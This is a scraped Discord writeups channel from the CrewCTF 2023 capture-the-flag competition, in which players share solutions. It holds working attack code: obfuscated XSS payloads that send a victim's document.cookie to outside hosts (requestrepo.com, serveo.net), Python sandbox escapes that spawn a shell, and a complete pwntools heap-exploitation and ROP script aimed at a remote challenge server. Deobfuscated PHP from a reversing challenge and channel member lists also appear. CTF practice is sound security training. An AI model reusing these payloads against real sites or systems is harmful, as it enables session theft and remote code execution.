Q=212[T+O+`S`+T+R+I+N+G]`31`[1];
V=31[T+O+`S`+T+R+I+N+G]`32`;
W=32[T+O+`S`+T+R+I+N+G]`33`;
X=101[T+O+`S`+T+R+I+N+G]`34`[1];
Z=35[T+O+`S`+T+R+I+N+G]`36`;
ARRAYITER=[]+[][E+N+T+R+I+E+S]``;
J=ARRAYITER[3];
PERIOD=+`11e100`+[];PERIOD=PERIOD[1];
FORWARDSLASH=STRING[F+R+O+M+`C`+H+A+R+`C`+O+D+E]`47`;

1

2
[2:00 AM]
One elephant in the room is that you can't call functions with () now, but luckily we can use template literals too:
https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses
So, now we can generate arbitrary strings, but we still can't write alert(1) for example. And in jsfuck you can write arbitrary javascript when you can reach Function.constructor, but because that uses eval under the hood, it's blocked by the CSP here. We need to access some other object from which we can access alert or other functions. An example would be window['alert'], which we could write as REF[A+L+E+R+T] if we can find a reference REF to the window object. This wasn't easy at all. In the global scope JSON, CSS and URL were defined, but for those it didn't seem like we could get to anything interesting.

In a lucid moment, I realised that we could just add an element to the DOM with an all caps id, so we can access that element in the global scope and then reach document:
<DIV ID=XSS>

Now we can reach document with XSS['ownerDocument']. We still don't have XSS however, because all XSS vectors that use eval won't work because of the CSP as mentioned before, but we can set document.location which is all we need for this challenge. So, we want our final payload to be:
document.location = "http://yz30jsyl.requestrepo.com?" + document.cookie

Which we can now do with:
XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][L+O+C+A+T+I+O+N]=FORWARDSLASH+FORWARDSLASH+Y+Z+3+0+J+S+Y+L+PERIOD+R+E+Q+U+E+S+T+R+E+P+O+PERIOD+C+O+M+`?`+XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][C+O+O+K+I+E]

And the payload html will be:
<DIV ID=XSS><IMG SRC=X ONERROR=[javascript]>

Where we still need to replace [javascript].
[2:00 AM]
The final payload becomes:
<DIV ID=XSS><IMG SRC=X ONERROR=A=`a`;B=`b`;C=`c`;D=`d`;E=`e`;F=`f`;INF=+`1e10001`;INFSTR=INF+[];I=INFSTR[3];N=INFSTR[1];T=INFSTR[6];Y=INFSTR[7];FALSE=1==0;FALSE=FALSE+[];L=FALSE[2];S=FALSE[3];TRUE=1==1;TRUE=TRUE+[];R=TRUE[1];U=TRUE[2];FLAT=[][F+L+A+T];FLAT=FLAT+[];O=FLAT[6];V=FLAT[27];EMPTYSTRING=[]+[];STRING=EMPTYSTRING[C+O+N+S+T+R+U+C+T+O+R];STRINGSTR=STRING+[];G=STRINGSTR[14];NUMBER=0[C+O+N+S+T+R+U+C+T+O+R];NUMBER=NUMBER+[];M=NUMBER[11];G=STRING[N+A+M+E][5];H=101[T+O+`S`+T+R+I+N+G]`21`[1];K=20[T+O+`S`+T+R+I+N+G]`21`;P=211[T+O+`S`+T+R+I+N+G]`31`[1];Q=212[T+O+`S`+T+R+I+N+G]`31`[1];V=31[T+O+`S`+T+R+I+N+G]`32`;W=32[T+O+`S`+T+R+I+N+G]`33`;X=101[T+O+`S`+T+R+I+N+G]`34`[1];Z=35[T+O+`S`+T+R+I+N+G]`36`;ARRAYITER=[]+[][E+N+T+R+I+E+S]``;J=ARRAYITER[3];PERIOD=+`11e100`+[];PERIOD=PERIOD[1];FORWARDSLASH=STRING[F+R+O+M+`C`+H+A+R+`C`+O+D+E]`47`;XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][L+O+C+A+T+I+O+N]=FORWARDSLASH+FORWARDSLASH+Y+Z+3+0+J+S+Y+L+PERIOD+R+E+Q+U+E+S+T+R+E+P+O+PERIOD+C+O+M+`?`+XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][C+O+O+K+I+E]>

1

the_mechanic — Today at 2:46 AM
@Moriarty intended way of reversing the obfuscated php in rev/ohPHP?

@the_mechanic
@Moriarty intended way of reversing the obfuscated php in rev/ohPHP?

Moriarty — Today at 2:47 AM
⁠official-writeups⁠

the_mechanic — Today at 2:49 AM
that doesn’t seem right lol, why does that script have a pcap file

Moriarty — Today at 2:49 AM
wait :O

the_mechanic — Today at 2:50 AM
the “solve” script has the solution it’s all good, i just wanted to know how the author intended for us to deobfuscate it

Moriarty — Today at 2:50 AM
it was for quirky my bad

the_mechanic — Today at 2:50 AM
cool no worries
[2:50 AM]
i checked out the script you sent for ohPHP, that didn’t have the deobfuscation part
[2:50 AM]
that’s why i asked

the_mechanic
the “solve” script has the solution it’s all good, i just wanted to know how the author intended for us to deobfuscate it

flocto — Today at 2:52 AM
code = open("chall.php", "r").read().splitlines()[1]

def parse_chr(line: str):
    # test if line is chr, if not return line else return parsed chr
    parts = line.strip().split(" ")

Expand
parse.py
5 KB
[2:52 AM]
horrible code but
[2:52 AM]
kinda parses to something readable

@flocto
Click to see attachment

Moriarty — Today at 2:52 AM
god

flocto — Today at 2:52 AM
oops that might be an older copy
[2:53 AM]
or a newer one idk
[2:53 AM]


REtard — Today at 2:53 AM


flocto — Today at 2:53 AM
this was the php i used anyway
<?php
(
    ('in_array')
    (
        ('count')
        (
Expand
outtest.php
6 KB
[2:55 AM]
yeah ok i lost the final copy of parse.py that i used LOL  
u can edit the script i sent to maybe generate something close

@flocto
Click to see attachment

the_mechanic — Today at 2:55 AM
good lord 
[2:56 AM]
props to you for writing that tho

flocto — Today at 2:56 AM


@flocto
this was the php i used anyway

the_mechanic — Today at 2:56 AM
<?php
((IN_arraY)((cOuNt)
((get_INcLuded_fILes)
()),[1])?((strcMp)((pHp_sapI_NaMe)(),cLI)?
(prINtf)(use pHp-cLI tO ruN tHe cHaLLeNge *):(prINtf)((gZINfLate)
((base64_decOde)(1dtrdYagdaXqe6fgac804dddfwYHvgMHbaKe/rfqff8gaqfKZ8arH0JeJY0qIIeNINtreY3qNNvuafuXZIgItJvqpIra4Yp2u8ZKtKMaNZewbaqg2LragbNwsL0vgd52LuLNLfgY9ZIZtdXcsLJ3+q/2rvu0XJI0JYL9aJfrZLJZXHgts65tws66wdr7fYZrftvc/wu9wpN6rqgc)))
(defINe)(f,(readLINe)(fLag':' )) //  f is our input
((strcMp)((strLeN)((cONstaNt)(f)),41)?(prINtf)(NOpe *):
((IN_arraY)((substr)((cONstaNt)(f),0),5),[crew[])?
((strstr)((strrev)((crc32)((substr)((cONstaNt)(f),5,4))),760)7349263)?((strNatcMp)(a;/K,(substr)((cONstaNt)(f),5,4)^(substr)((cONstaNt)(f),9,4))?
(prINtf)(NOpe XOr *):
(sraNd)(31337)
(defINe)(d,(OpeNssL_decrYpt)(wcX3NcMHO0)rZ00)sXg2KHXa==,aes-128-cbc,(substr)((cONstaNt)(f),0),16),2,(pacK)(L*,(raNd)(),(raNd)(),(raNd)(),(raNd)())))((IN_arraY)((arraY_suM)([(ctYpe_prINt)((cONstaNt)(d)),(strpOs)((substr)((cONstaNt)(f),15,17),(cONstaNt)(d))]),[2])?((strcMp)((base64_eNcOde)((HasH)(sHa256,(substr)((cONstaNt)(f),0),32))^(substr)((cONstaNt)(f),32)),rwdrvwuHrqvf)?(prINtf)(NOpe *):(prINtf)(cONgratuLatIONs',' tHIs Is tHe rIgHt fLag *)):(prINtf)(NOpe *))):(prINtf)(NOpe *)):(prINtf)(NOpe *)))):(prINtf)(NOpe *));
[2:56 AM]
spent a little more time got a little cleaner code

flocto — Today at 2:56 AM
how did you get capital letters 

the_mechanic — Today at 2:56 AM
i just really want to know the author’s intended way of solving

@flocto
how did you get capital letters 

the_mechanic — Today at 2:57 AM
script to xor and evaluate the stuff inside ()

flocto — Today at 2:57 AM
unfortunately fredd is gone for now so who knows XD (edited)

the_mechanic — Today at 2:57 AM
wdym gone :0

@the_mechanic
i just really want to know the author’s intended way of solving

Moriarty — Today at 2:57 AM
the author will be available in 1 to 365 business days 

1

the_mechanic
wdym gone :0

flocto — Today at 2:57 AM


the_mechanic — Today at 2:57 AM
am i missing something here
[2:57 AM]
some lore perhaps

the_mechanic
script to xor and evaluate the stuff inside ()

flocto — Today at 2:58 AM
yeah xor should give lowercase letters in most cases

@the_mechanic
am i missing something here

Moriarty — Today at 2:58 AM
nah , he just busy with something !! but dont expect his solution any soon

flocto — Today at 2:58 AM
like rand, printf and other function calls (edited)

Untrue — Today at 2:58 AM
safe-proxy https://untrue.me/writeups/crewctf2023/safe-proxy/

1

@flocto
yeah xor should give lowercase letters in most cases

the_mechanic — Today at 2:58 AM
i had a hunch to xor with 16 in some cases

flocto — Today at 2:58 AM
idk ur output was better than mine tho so gj xd

the_mechanic — Today at 2:58 AM
script prolly messed up somewhere
[2:58 AM]
still readable tho so 

flocto — Today at 2:59 AM
ye

flocto
Click to see attachment

flocto — Today at 3:00 AM
ah okay this script has the issue with parsing stuff in () where it cuts off some parts for absolutely no reason i forgot how i fixed 

S4mS3pi0l — Today at 4:10 AM
Hex2dec payload without Use of toLowerCase

S4mS3pi0l — Today at 4:24 AM
<K ID=A><DIV ID=B><IMG SRC ID=AA ONERROR=DOT=[A[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]+[]][0];AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]=`HTTPS:`+DOT[5]+DOT[5]+`IMBRIUM`+DOT[18]+`SERVEO`+DOT[18]+`NET?C=`+AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][5]+[A+[]][0][1]+[A+[]][0][1]+[A+[]][0][14]+[B+[]][0][13]+[A+[]][0][4]]>

Fuzzli — Today at 4:43 AM
My full writeup for hex2dec: https://github.com/L-T-B/CTFS/blob/main/crew-ctf/web/hex2dec.md
GitHub
CTFS/crew-ctf/web/hex2dec.md at main · L-T-B/CTFS
CTF Writeups. Contribute to L-T-B/CTFS development by creating an account on GitHub.


1

Crazyman — Today at 4:47 AM
cvt_buf = new ArrayBuffer(8);
cvt_f64a = new Float64Array(cvt_buf);
cvt_u64a = new BigUint64Array(cvt_buf);
cvt_u32a = new Uint32Array(cvt_buf);


Expand
sol.js
11 KB
[4:48 AM]
my typr exploit work local failed remote XD

Quasar — Today at 4:49 AM
[id for sys.stdout.flush in [id.__self__.__dict__[mA] for aA,bA,cA,dA,eA,fA,gA,hA,iA,jA,kA,lA,mA,nA,oA,pA,qA,rA,sA,tA,uA,vA,wA,xA,yA,zA,aB,bB,cB,dB,eB,fB,gB,hB,iB,jB,kB,lB,mB,nB,oB,pB,qB,rB,sB,tB,uB,vB,wB,xB,yB,zB,aC,bC,cC,dC,eC,fC,gC,hC,iC,jC,kC,lC,mC,nC,oC,pC,qC,rC,sC,tC,uC,vC,wC,xC,yC,zC,aD,bD,cD,dD,eD,fD,gD,hD,iD,jD,kD,lD,mD,nD,oD,pD,qD,rD,sD,tD,uD,vD,wD,xD,yD,zD,aE,bE,cE,dE,eE,fE,gE,hE,iE,jE,kE,lE,mE,nE,oE,pE,qE,rE,sE,tE,uE,vE,wE,xE,yE,zE,aF,bF,cF,dF,eF,fF,gF,hF,iF,jF,kF,lF,mF,nF,oF,pF,qF,rF,sF,tF,uF,vF,wF,xF,yF,zF,aG in [id.__self__.__dict__]]]
 starship
just setting sys.stdout.flush to breakpoint

2

Crazyman — Today at 4:49 AM
strong!!!!!

Crazyman
Click to see attachment

Crazyman — Today at 4:52 AM
This payload is used to reverse the shell and can work locally, including using runner.go to simulate the environment

Quasar — Today at 4:58 AM
dumb starship-1 payload, my 2 braincells decided to run eval("__import__('os').system('sh')") instead of eval(input())
a = """@__build_class__.__self__.eval
@__build_class__.__self__.bytes
@__build_class__.__self__.copyright._Printer__filenames.__add__
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
Expand
message.txt
3 KB

snwo — Today at 5:52 AM
<?php
if (in_array(count(get_included_files()), ['1'])) {
    if (strcmp(php_sapi_name(), 'cli')) {
        printf('Use php-cli to run the challenge!\n');
    } else {
        printf(gzinflate(base64_decode('1dTBDYAgDAXQe6fgaC8O4DDdfwyhVGmhbaKe/BfQfF8gAQFKz8aRh0JEJY0qIIenINTBEY3qNNVUAfuXzIGitJVqpiBa4yp2U8ZKtKmANzewbaqG2lrAGbNWslOvgD52lULNLfgY9ZiZtdxCsLJ3+Q/2RVuOxji0jyl9aJfrZLJzxhgtS65TWS66wdr7fYzRFtvc/wU9Wpn6BQGc')));
        define('F', readline('Flag: '));
        if (strcmp(strlen(constant('F')), '41')) {
            printf('Nope!\n');
        } else {
            if (in_array(substr(constant('F'), 0, 5), ['crew{'])) {
                if (strstr(strrev(crc32(substr(constant('F'), 5, 4))), '7607349263')) {
                    if (strncmp('A'.'\x1b'.'/'.'k',substr(constant('F'),'5','4')^substr(constant('F'),'9','4'))) {
                        printf('Nope xor!\n');
                    } else {
                        srand(31337);
                        define('D', openssl_decrypt('wCX3NcMho0BZO0SxG2kHxA==','aes-128-cbc', substr(constant('F'), 0, 16), 2, pack('L*', rand(), rand(), rand(), rand())));
                        if (in_array(array_sum([ctype_print(constant('D')), strpos(substr(constant('F'), 15, 17), constant('D'))]), ['2'])) {
                            if (strcmp(base64_encode(hash('sha256', substr(constant('F'), 0, 32))^substr(constant('F'), 32)), 'BwdRVwUHBQVF')) {
                                printf('Nope!\n');
                            } else {
                                printf('Congratulations, this is the right flag!\n');
                            }
                        } else {
                            printf('Nope!\n');
                        }
                    }
                } else {
                    printf('Nope!\n');
                }
            } else {
                printf('Nope!\n');
            }
        }
    }
} else {
    printf('Nope!\n');
}
 (edited)
[5:52 AM]
more clean code about ohPHP

flocto — Today at 6:09 AM
omg how 

Quasar
dumb starship-1 payload, my 2 braincells decided to run eval("__import__('os').system('sh')") instead of eval(input())

flocto — Today at 6:10 AM
lol just define multiple classes

@flocto
lol just define multiple classes

Quasar — Today at 6:17 AM
i had a prebuilt payload for 1 class
[6:17 AM]
so
[6:17 AM]
:/
[6:17 AM]
yk

flocto — Today at 6:18 AM
no

Quasar — Today at 6:41 AM
ya yk

Neobeo — Today at 8:44 AM
my solve scripts for the entire crypto category. now with maximum  :
https://github.com/Neobeo/CrewCTF2023/blob/main/crypto_writeups.ipynb
GitHub
CrewCTF2023/crypto_writeups.ipynb at main · Neobeo/CrewCTF2023
Contribute to Neobeo/CrewCTF2023 development by creating an account on GitHub.


4

Message #writeups
﻿




Members list for writeups (channel)
AUTHOR, 4 MEMBERSAUTHOR — 4

CSN3RD

GG CrewCTF

Dared

LinuxBro
(head, eyes)

y011d4
MODMAIL, 1 MEMBERMODMAIL — 1

ModMail
BOT
Playing DM to Contact Staff | =help
ONLINE, 193 MEMBERSONLINE — 193

0100.0001

0xOziel

0xwarriorh

4bug

4k95m

_सभ्य_

A44

ACHUX21

Adirajuuuu

Ainsetin


alfin
c'est la vie

APN

Arasy Dafa Sulistya Kurniawan

Arata

armatura

artemxbm
Лицевая часть диполя(И его жопка)

Arty06

Est ce que je vais trouver la réponse ?

Austen
(╯°□°）╯︵ ┻━┻

BaoDoktah

Barsa

BBQ

beluga
Playing Kali Linux with Mac Look
#!/usr/bin/env python
from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./company")
libc = elf.libc

sla = lambda x, y: p.sendlineafter(x, y)
sa  = lambda x, y: p.sendafter(x, y)
rl  = lambda: p.recvline()
sl  = lambda x: p.sendline(x)
c   = lambda x: str(x).encode()

gdbscript = """
b *iconv+197
c
"""
def register(idx, name, position, salary, no=False, no1=False):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b':', str(idx).encode())
    if no:
        p.sendafter(b':', name)
    else:
        p.sendlineafter(b':', name)
    if no1:
        p.sendafter(b':', position)
    else:
        p.sendlineafter(b':', position)
    p.sendlineafter(b':', str(salary).encode())

def fire(idx):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b':', str(idx).encode())

def feedback(hr, idx, feedback):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'?', str(hr).encode())
    p.sendlineafter(b'?', str(idx).encode())
    p.sendlineafter(b':', feedback)

def view_feedback(idx):
    p.sendlineafter(b'>>', b'4')
    p.sendlineafter(b'?', str(idx).encode())
    p.recvuntil(b'Feedback: ')
    return p.recvline()[:-1]

def read(addr):
    register(1, b"D", b"HR\x00", 0x1339)
    feedback(1, 1, b"E"*0x40 + p64(addr))
    fire(1)
    register(1, b"B", b"HR\x00", 0)
    leak = view_feedback(1)
    print(leak)
    leak = u64(leak[:8].ljust(8,b'\x00'))
    feedback(1, 1, b"E"*0x40 + p64(0))
    fire(1)
    return leak

def return_arb_ptr(addr):
    register(2, b"A", b"HR\x00", 0x1337)
    feedback(2, 2, b"A"*0x40 + p64(addr))
    fire(2)
    register(2, b"B", b"HR\x00", 0x1337)
    fire(2) # attempts to call free(addr)


p = remote("company.chal.crewc.tf", 17001)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

p.sendlineafter(b'What is your name? ', p64(0) + p64(0x61) + p64(0))

# JoshL solved most of it tho :)
register(0, b"A", b"HR\x00", 0x1337)
feedback(0, 0, b"A"*0x40 + p64(0x00404060+0x10))
fire(0)
register(1, b"B", b"HR\x00", 0x1337)
fire(1) # attempts to call free(0x00404060+0x10)
register(0, b"C"*0x10 + b"HR\x00", b"HR\x00", 0) # Got HR now


heap_leak = read(0x004040a8)
info("Heap leak %s", hex(heap_leak))
puts_libc = read(0x403fa0)
info("Libc leak %s", hex(puts_libc))

libc.address = puts_libc - libc.symbols['puts']
rop = ROP(libc)
info("Libc base %s", hex(libc.address))

stack_leak = read(libc.address + 0x7fc7955fe320-0x007fc795400000)
info("Stack leak %s", hex(stack_leak))
ret_ptr = stack_leak +0x007ffc15e06398-0x7ffc15e064f8
info("Return pointer %s", hex(ret_ptr))
stack_cookie = (read(ret_ptr - 0x10+1) << 0x8) & 0xffffffffffffffff
info("Stack cookie %s", hex(stack_cookie))

path = b"./" + b'\x00'

register(3, b"A"*0x18, b"A"*0x18, 0x41)
register(4, b"B"*0x18, b"B", 0x61)
register(5, b"C"*0x18, b"C"*0x18, 0x43)
register(6, b"D"*0x18, b"D"*0x18, 0x43)
register(7, path + (b"E"*(0x18-len(path))), b"E"*0x18, 0x43)

fire(3)
fire(6)

return_arb_ptr(heap_leak+0x20f21d0-0x20f2170-0x10)
info("Fake pointer at %s", hex(heap_leak+0x20f21d0-0x20f2170-0x10))
heap_ptr = heap_leak+0x20f21d0-0x20f2170
target = ret_ptr-0x8
register(8, p64(0)+p64(0x60)+p64(target ^ (heap_ptr >> 12)) + b"A"*8, b"F"*0x18, 0x1337133713371337, no=True)

register(3, b"A"*0x18, b"A"*0x18, 0x41)
register(6, b"/flag\x00\x00\x00" + p64(rop.rdi[0])+p64(ret_ptr)+p64(libc.symbols['gets']), p64(rop.rdi[0])+p64(ret_ptr)+p64(libc.symbols['gets']), 0x41, no=True)

flag_str = heap_leak + 0x1d69f50 - 0x1d69dd0
syscall = rop.find_gadget(['syscall', 'ret'])[0]

payload = b"A"*0x30

rop.read(0, libc.bss(0x100), 0x30)
payload += b''.join([
    rop.chain(),

    p64(rop.rdi[0]),
    p64(libc.bss(0x100)),
    p64(rop.rsi[0]),
    p64(int(constants.O_RDONLY)),
    p64(rop.rdx[0]),
    p64(0),
    p64(rop.rax[0]),
    p64(2),
    p64(syscall),

    p64(rop.rdi[0]),
    p64(3),
    p64(rop.rsi[0]),
    p64(libc.bss(0x500)),
    p64(rop.rdx[0]),
    p64(0x500),
    p64(rop.rax[0]),
    p64(0),
    p64(syscall),

    p64(rop.rdi[0]),
    p64(1),
    p64(rop.rsi[0]),
    p64(libc.bss(0x500)),
    p64(rop.rdx[0]),
    p64(0x100),
    p64(rop.rax[0]),
    p64(1),
    p64(syscall),
])
p.sendline(payload)
p.sendline(b"./flag_you_found_this_my_treasure_leaked.txt\x00")
p.interactive()
